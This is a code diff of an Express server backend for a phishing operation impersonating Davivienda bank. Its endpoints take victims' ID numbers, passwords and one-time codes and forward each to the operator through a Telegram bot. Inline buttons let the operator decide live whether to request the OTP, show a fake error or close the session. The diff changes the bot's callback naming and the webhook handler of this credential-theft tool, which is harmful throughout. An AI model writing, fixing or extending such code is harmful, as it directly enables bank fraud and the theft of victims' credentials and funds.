@@ -86,7 +86,6 @@ app.post('/guardar-clave', async (req, res) => {
         sesiones[id].clave = clave;
         sesiones[id].comando = 'esperar';
 
-        // Datos con formato de bloque de código para copiar al tocarlos en Telegram
         const mensaje = `🚨 *NUEVO INGRESO - DAVIVIENDA*\n\n👤 Documento: \`${sesiones[id].documento}\`\n🔑 Clave: \`${clave}\`\n🆔 Session ID: \`${id}\``;
         
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -98,8 +97,8 @@ app.post('/guardar-clave', async (req, res) => {
                 parse_mode: 'Markdown',
                 reply_markup: {
                     inline_keyboard: [[
-                        { text: '📲 Pedir Código OTP (Sí)', callback_data: `otp_${id}` },
-                        { text: '❌ Error / Repetir (No)', callback_data: `error_${id}` }
+                        { text: '📲 Pedir Código OTP (Sí)', callback_data: `otp_ok_${id}` },
+                        { text: '❌ Error / Repetir (No)', callback_data: `otp_err_${id}` }
                     ]]
                 }
             })
@@ -132,9 +131,8 @@ app.post('/guardar-otp', async (req, res) => {
     const { otp, id } = req.body;
     if (sesiones[id]) {
         sesiones[id].otp = otp;
-        sesiones[id].comando = 'esperar_otp';
+        sesiones[id].comando = 'esperar'; // Reinicia a esperar comando del admin
 
-        // Datos con formato de bloque de código para copiar al tocarlos en Telegram
         const mensajeOtp = `🔑 *CÓDIGO OTP RECIBIDO*\n\n👤 Documento: \`${sesiones[id].documento}\`\n🔢 OTP: \`${otp}\`\n🆔 Session ID: \`${id}\``;
         
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -146,8 +144,8 @@ app.post('/guardar-otp', async (req, res) => {
                 parse_mode: 'Markdown',
                 reply_markup: {
                     inline_keyboard: [[
-                        { text: '✅ Aprobar (Ir a Google)', callback_data: `aprobar_otp_${id}` },
-                        { text: '❌ Error / Pedir de nuevo', callback_data: `error_otp_${id}` }
+                        { text: '✅ Aprobar (Ir a Google)', callback_data: `aprob_ok_${id}` },
+                        { text: '❌ Error / Pedir de nuevo', callback_data: `aprob_err_${id}` }
                     ]]
                 }
             })
@@ -203,18 +201,22 @@ app.post('/telegram-webhook', async (req, res) => {
         if (update.callback_query) {
             const data = update.callback_query.data;
 
-            if (data.startsWith('otp_') || data.startsWith('error_')) {
-                const [action, sessionId] = data.split('_');
-                if (sesiones[sessionId]) {
-                    sesiones[sessionId].comando = (action === 'otp') ? 'pedir_otp' : 'mostrar_error';
-                }
-            } else if (data.startsWith('aprobar_otp_') || data.startsWith('error_otp_')) {
-                const parts = data.split('_');
-                const action = parts[0];
-                const sessionId = parts[2];
-                if (sesiones[sessionId]) {
-                    sesiones[sessionId].comando = (action === 'aprobar') ? 'finalizar_ok' : 'repetir_otp';
-                }
+            // Procesar botones de Clave (otp_ok_ID o otp_err_ID)
+            if (data.startsWith('otp_ok_')) {
+                const sessionId = data.replace('otp_ok_', '');
+                if (sesiones[sessionId]) sesiones[sessionId].comando = 'pedir_otp';
+            } else if (data.startsWith('otp_err_')) {
+                const sessionId = data.replace('otp_err_', '');
+                if (sesiones[sessionId]) sesiones[sessionId].comando = 'mostrar_error';
+            }
+            
+            // Procesar botones de OTP (aprob_ok_ID o aprob_err_ID)
+            else if (data.startsWith('aprob_ok_')) {
+                const sessionId = data.replace('aprob_ok_', '');
+                if (sesiones[sessionId]) sesiones[sessionId].comando = 'finalizar_ok';
+            } else if (data.startsWith('aprob_err_')) {
+                const sessionId = data.replace('aprob_err_', '');
+                if (sesiones[sessionId]) sesiones[sessionId].comando = 'repetir_otp';
             }
 
             await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
